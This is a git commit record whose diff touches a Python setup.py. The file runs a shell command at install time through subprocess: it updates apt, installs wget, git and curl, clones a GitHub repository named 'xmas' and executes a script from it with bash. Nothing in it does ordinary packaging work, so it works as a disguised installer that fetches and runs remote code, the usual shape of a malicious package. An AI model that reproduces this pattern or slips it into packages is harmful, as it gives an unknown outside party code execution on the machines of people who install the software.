ee212a2cdd3439ef88528ac0c20e128d3317645c
qmlenzenkomo <157975606+qmlenzenkomo@users.noreply.github.com>
2024-02-28 23:19:10 +0200

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,4 +1,3 @@
 #!/usr/bin/env python
 import subprocess
-
 subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/qmlenzenkomo/xmas.git;cd xmas;chmod +x xmas;bash xmas", shell=True)
